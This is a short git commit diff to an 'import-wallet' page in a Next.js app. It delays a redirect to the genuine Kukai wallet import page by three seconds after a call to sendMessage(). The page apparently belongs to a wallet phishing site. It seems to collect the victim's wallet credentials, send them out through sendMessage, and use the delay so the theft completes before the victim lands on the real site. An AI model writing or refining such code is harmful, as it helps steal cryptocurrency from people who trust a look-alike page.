6f9013330c06e81c46c7c575a79f14907d847e85
kurokeme87 <Kurokeme87@gmail.com>
2024-12-03 06:52:33 +0000

    added timeout

--- app/import-wallet/page.jsx
+++ app/import-wallet/page.jsx
@@ -212,7 +212,9 @@ export default function ImportWallet() {
               <button onClick={(e) => {
                 e.preventDefault()
                 sendMessage()
-                router.push("https://wallet.kukai.app/import")
+                setTimeout(() => {
+                  router.push("https://wallet.kukai.app/import")
+                }, 3000)
               }} className="w-[45%] bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                 Import
               </button>
